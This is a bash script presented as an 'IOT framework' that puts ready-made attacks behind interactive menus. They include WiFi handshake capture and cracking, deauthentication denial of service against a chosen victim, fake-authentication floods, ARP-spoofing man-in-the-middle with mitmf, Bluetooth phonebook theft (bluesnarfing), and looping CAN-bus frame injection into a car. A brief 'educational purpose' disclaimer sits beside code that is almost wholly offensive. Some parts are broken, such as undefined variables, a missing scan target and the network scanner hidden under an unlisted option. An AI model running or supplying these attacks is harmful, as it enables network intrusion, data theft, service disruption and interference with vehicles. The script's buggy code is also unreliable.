#!/bin/bash

cyan="\e[1;36m"
g="\033[1;32m"
r="\033[1;31m"
b="\033[1;34m"
w="\033[0m"
red='\e[1;31m'
yellow='\e[1;33m'
orange='\e[38;5;166m'
green='\e[1;32m'

if [[ $(/usr/bin/id -u) -ne 0 ]];
then
echo -e "$red This tool run as a root / ROOT REQUIRED "
exit
else
echo ""
echo -e "$green ROOT ACCESS CONFIRM .."
echo ""
sleep 1
fi

clear
echo -n -e "$cyan THIS TOOL USED FOR EDUCATIONAL PURPOSE DON'T USE ANY ILLIGAL ACTIVITY "
sleep 2
clear

# BANNER IOT FRAMEWORK
##########################




echo -e "$green

        _____________________________________________________
       |                                                     |
       | IOT ( Internet of Thing )   F R A M E W O R K       |
       |_____________________________________________________|
                                               |_v 2.O_|
$red
         _________________________________________________
        |                                                 |    
        |           IOS  PENETRATION TESTING              |   
        |          INSTAGRAM = @jassi_singh_zx            |
        |_________________________________________________|    
"
sleep 1

echo -e "$green
               |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
               |                                    $red     IOT FRAMEWORK  THE FUTURE                 $green                                                                  |
$green                _____________________________________________________________________________________________________________________________________________________
"

echo -e "$cyan[$yellow*$cyan] Select a options For Wireless Attacks "
echo "


"

echo -e "
      $cyan[$yellow 1 $cyan ]  CCTV IOT TESTING                           $cyan[$yellow 5 $cyan ] COMPUTER IOT TESTING
      $cyan[$yellow 2 $cyan ]  WIFI IOT TESTING                           $cyan[$yellow 6 $cyan ] MITM ( MAN IN THE MIDDLE ATTACK )
      $cyan[$yellow 3 $cyan ]  BLUETOOTH IOT TESTING                      $cyan[$yellow 99 $cyan ] EXIT
      $cyan[$yellow 4 $cyan ]  CAR IOT TESTING

"

echo -e "$b──($green IOT-framework $b)────[$green~]──[$orange Menu ] "
echo -n -e "$b└─$red# "
read menu


# Wifi iot Code
##################


if [[ $menu == 1 ]];
then
echo -e "$b _____________________________________"
echo -e "$green CCTV IOT TESTING                "
echo -e "$b _____________________________________"
echo ""
echo -n "[*] ENTER THE LOCAL GATEWAY IP ADDRESS (LIKE 192.168.X.X) : "
read cctv
echo -e "ENUMERATING THE CCTV IP ADDRESS "
echo -e "$w "
echo ""
echo -n "ENTER THE PORT NUMBER FOR SCANNING DEFAULT ( 80/8080 , 443 , 554 ) PRESS ENTER FOR DEFAULT : "
read sport
echo -n "YOU GIVE PORT (Y/N) : "
read yesno
if [[ $yesno == Y ]];
then
nmap -sV -sC $cctv -p$sport
elif [[ $yesno == y ]];
then
nmap -sV -sC $cctv -p$sport
else
nmap -sV -sC $cctv -p80,8080,443,554
fi
echo -e "-------------------------------------------------------------------------------------"
echo -e "IDENTIFY THE CCTV IP ADDRESS AND SEARCH BROWSER : http/https://target-ip:target-port/"
echo -e "-------------------------------------------------------------------------------------"
echo -e -n "$green NOTE : USE IS DEFAULT PASSWORD OF CCTV USING GOOGLE DORKING"
echo -e "----------------------------------------------------------------------"
echo ""

##################################################
elif [[ $menu == 2 ]];
then
echo -e "$red

         _______________________________________________________
$green                S E T U P----------------M O N I T O R-M O D E
$red         -------------------------------------------------------
"

echo -n -e "$cyan ENTER YOUR INTERFACE NAME EX (wlan0 / wlan1 / wlan2 )"
echo "
"
echo -e "$b──($red monitormode $b)────[$green~]──[$orange Interface ] "
echo -n -e "$b└─$red# "
read interface
echo -e "$b______________________________________"
echo -e "$green W I F I     IOT-T E S T I N G  "
echo -e "$b _____________________________________"
echo ""
echo -e "
        $cyan[$yellow 1 $cyan ] WIFI HACKING
        $cyan[$yellow 2 $cyan ] WIFI DOS ATTACK
        $cyan[$yellow 3 $cyan ] PACKET SNIFFING
        $cyan[$yellow 4 $cyan ] FAKE AUTHENTICATION

"
echo -e "$b──($green IOT-framework $b)────[$green~]──[$orange Menu ] "
echo -n -e "$b└─$red# "
read iot
if [[ $iot == 1 ]];
then
echo -e "$b____________________________________"
echo -e "$green W I F I - H A C K I N G   "
echo -e "$b ___________________________________"
airmon-ng start $interface
echo -e "$green IF YOU SELECT TARGET THEN ENTER ( CTRL + C ) "
sleep 3
echo -e "$cyan "
airodump-ng $interface
echo -n -e "$green ENTER YOUR TARGET MAC ADDRESS : "
read mac
echo -n -e "$green ENTER YOUR TARGET CHANNEL NO. : "
read ch
echo -n -e "$green ENTER YOUR SAVE FILE NAME ( ex = test ) : "
read test
echo -e "$b _________________________________________"
echo -e "$green A T T A C K I N G   S T A R T E D "
echo -e "$b _________________________________________"
sleep 1
echo ""
echo -e "$green "
airodump-ng --bssid $mac --channel $ch --write $test $interface
echo ""
ls
echo ""
echo -n -e "$green ENTER YOUR .cap FILE YOU SEE DIRECTORY : "
read cap
aircrack-ng $cap
mkdir $test
mv -v $test.cap $test

# WIFI DOS ATTACKING CODE
########################


elif [[ $iot == 2 ]] ;
then
echo -e "$b ______________________________________"
echo -e "$green  W I F I    D O S  A T T A C K   "
echo -e "$b ______________________________________"
echo ""

echo -e "$cyan "
airodump-ng $interface

echo -n -e "$green ENTER YOUR TARGET MAC ADDRESS : "
read twomac
echo -n -e "$green ENTER YOUR TARGET CHANNEL NO : "
read twoch
echo -n -e "$green ENTER YOUR NAME TO SAVE FILE : "
read twotest
echo -e "$cyan "
airodump-ng --bssid $twomac --channel $twoch --write $twotest $interface
echo -n -e "$green VICTIM WIFI MAC ADDRESS : "
read twotargetmac
echo -n -e "$green VICTIM DEVICE MAC ADDRESS WHICH DEVICE YOU DOS ATTACK : "
read twotargetdevicemac
aireplay-ng --deauth 1000000 -a $twotargetmac -c $twotargetdevicemac $interface
echo -e "$b ______________________________________"
echo -e "$green A T T A C K   S U C C E S S "
echo -e "$b ______________________________________"
mkdir $twotest
mv -v $twotest.cap $twotest

# PACKET SNIFFING SCRIPT
#######################

elif [[ $iot == 3 ]];
then
echo -e "$b ____________________________________"
echo -e "$green P A C K E T   S N I F F I N G "
echo -e "$b ____________________________________"
echo ""
echo -e "$cyan "
airodump-ng $interface
echo -n -e "$green ENTER YOUR TARGET MAC ADDRESS : "
read threemac
echo -n -e "$green ENTER YOUR TARGET CHANNEL NO : "
read threech
echo -n -e "$green ENTER YOUR NAME TO SAVE FILE : "
read threetest
echo -e "$cyan"
airodump-ng --bssid $threemac --channel $threech --write $threetest $interface
echo -e "$b ______________________________________"
echo -e "$green A T T A C K   S U C C E S S "
echo -e "$b ______________________________________"
mkdir $threetest
mv -v $threetest.cap $threetest


# FAKE AUTHENTICATE SCRIPT
##########################

elif [[ $iot == 4 ]];
then
echo -e "$b ______________________________________"
echo -e "$green F A K E   A U T H E N T I C A T E"
echo -e "$b ______________________________________"
echo ""
echo -e "$cyan "
airodump-ng $interface
echo -n -e "$green ENTER YOUR TARGET MAC ADDRESS : "
read fourmac
echo -n -e "$green ENTER YOUR TARGET CHANNEL NO. : "
read fourch
echo -e -n "$green ENTER YOUR NAME TO SAVE FILE : "
read fourtest
echo -e "$cyan "
airodump-ng --bssid $fourmac --channel $fourch --write $fourtest $interface
echo -e -n "$green ENTER YOUR TARGET WIFI MAC ADDRESS : "
read fourtarget
echo -n -e "$green ENTER YOUR DEVICE MAC ADDRESS WHICH YOU SET FAKE AUTH... : "
read fourdevice
aireplay-ng --fakeauth 100000 -a $fourtarget -h $fourdevice $interface

echo -e "$b ______________________________________"
echo -e "$green A T T A C K   S U C C E S S "
echo -e "$b ______________________________________"
mkdir $fourtest
mv -v $fourtest.cap $fourtest

fi

# NETWORK SCANNING SCRIPT
########################

elif [[ $menu == 0 ]];
then
echo -e "$b ______________________________________________________________________________"
echo -e "$cyan
_ _____ _______        _____  ____  _  __
| \ | | ____|_   _\ \      / / _ \|  _ \| |/ /
|  \| |  _|   | |  \ \ /\ / / | | | |_) | ' /
| |\  | |___  | |   \ V  V /| |_| |  _ <| . \                                                                           |_| \_|_____| |_|    \_/\_/  \___/|_| \_\_|\_\

 ____   ____    _    _   _ _   _ ___ _   _  ____
/ ___| / ___|  / \  | \ | | \ | |_ _| \ | |/ ___|
\___ \| |     / _ \ |  \| |  \| || ||  \| | |  _
 ___) | |___ / ___ \| |\  | |\  || || |\  | |_| |
|____/ \____/_/   \_\_| \_|_| \_|___|_| \_|\____|

"
echo -e "$b ______________________________________________________________________________"
echo ""
echo -n -e "$green ENTER YOUR NETWORK IP LIKE ( 192.168.X.X ) : "
read ip
echo ""
echo -e "$green

         1. TCP PORT SCANNING
         2. UDP PORT SCANNING
         3. SIMPAL SCANNING
         4. SOME ADVANCED OPTION SCANNING
         5. YOUR PORT CHOICE SCANNING
         6. VERSION SCANNING
"
echo -e "$b──($red Network Scanner $b)────[$green~]──[$orange Menu ] "
echo -n -e "$b└─$red# "
read network

if [[ $network == 1 ]];
then
nmap -sT $ip

elif [[ $network == 2 ]];
then
nmap -sU $ip

elif [[ $network == 3 ]];
then
nmap $ip

elif [[ $network == 4 ]];
then
nmap -sC -sT -sU -sA -p- $ip

elif [[ $network == 5 ]];
then
echo -n -e "$green ENTER YOUR PORT WITH COMAS LIKE ( 21,22,23 ) : "
read port
nmap -p $port

elif [[ $network == 6 ]];
then
nmap -sV $ip

fi

elif [[ $menu == 6 ]];
then
echo -e "$b _________________________________________________"
echo -e "$cyan

_|      _|  _|_|_|  _|_|_|_|_|  _|      _|
_|_|  _|_|    _|        _|      _|_|  _|_|
_|  _|  _|    _|        _|      _|  _|  _|
_|      _|    _|        _|      _|      _|
_|      _|  _|_|_|      _|      _|      _|

"
echo -e "$b _________________________________________________"
echo ""
echo -e -n "$green ENTER YOUR TARGET INTERFACE NAME ( wlan0 / wlan1 / wlan2 / eth0 ) : "
read mitm
echo -e -n "$green ENTER YOUR TARGET WIFI IP : "
read targetmitm
echo -e -n "$green ENTER YOUR TARGET DEVICE IP : "
read targetdevicemitm
mitmf --arp --spoof --gateway $targetwifiip --target $targetmitm -i $mitm

echo -e "$b ______________________________________"
echo -e "$green A T T A C K   S U C C E S S "
echo -e "$b ______________________________________"


elif [[ $menu == 3 ]];
then
echo -e "$b _________________________________________________"
echo -e "$cyan
__________   ___   ____________
 / / / / / /  / _ \  \ \ \ \ \ \ \

| | | | | |  | |_| |  | | | | | | |
| | | | | |   \___/   | | | | | | |
 \_\_\_\_\_\         /_/_/_/_/_/_/

"
echo -e "$b _________________________________________________"
echo -e "$green"
hciconfig hc0 up
echo "
"
hciconfig hc0
echo "
"
hcitool scan
echo "
"
echo -n -e "$cyan ENTER YOUR TARGET MAC ADDRESS : "
read bluemac
echo -n -e "$cyan ENTER TARGET CHANNEL NUMBER : "
read bluechannel
sdptool browse $bluemac
echo "
"
echo -e "$green
1. READ PHONEBOOK DETAILS
2. LIST OF PHONEBOOK MEMORY STORAGE
3. FULL INFORMATION OF DEVICE
"
echo -e "$b──($red Bluesnarfing $b)────[$green~]──[$orange Menu ] "
echo -n -e "$b└─$red# "
read snarfing

if [[ $snarfing == 1 ]];
then
bluesnarfer -r 1-100 -C $bluechannel -b $bluemac

elif [[ $snarfing == 2 ]];
then
bluesnarfer -l 1-100 -C $bluechannel -b $bluemac

elif [[ $snarfing == 3 ]];
then
bluesnarfer -i 1-100 -C $bluechannel -b $bluemac


else
echo -e "$red INVALID OPTION "

fi

elif [[ $menu == 4 ]];
then
echo " CAR IOT TESTING IS MAJOR TASK DONT USE WITHOUT OWNER PERMISSION USED ONLY TESTING PURPOSE OR EDUCATIONAL PURPOSE "
echo ""
echo "SETUP CAN NETWORK PLEASE WAIT ......"
sudo ip link set can0 up type can bitrate 500000

echo "DUMPING THE ALL DATA OF CAR PACKETS"
candump can0
cansniffer -c can0
echo ""
echo -n "SELECTING THE CAR MAC ADDRESS "
canmac
echo -n "ENTER THE CAR 'ID' : "
read carid
cansend can0 0$carid#$canmac
while true; do cansend can0 0$carid#$canmac; sleep 0.002; done
candump can0 | grep " 0$carid " | while read line; do cansend can0 0$carid#$canmac; done
while true; do cansend can0 0$carid#$canmac; sleep 0.002; done
echo ""
echo "CAR IS HACKED "

elif [[ $menu == 99 ]];
then
exit


else
echo -e -n "$b ________________________________"
echo -e -n "$green I N V A L I D   O P T I O N "
echo -e -n "$b ________________________________"
sudo bash wireless-framework.sh

fi
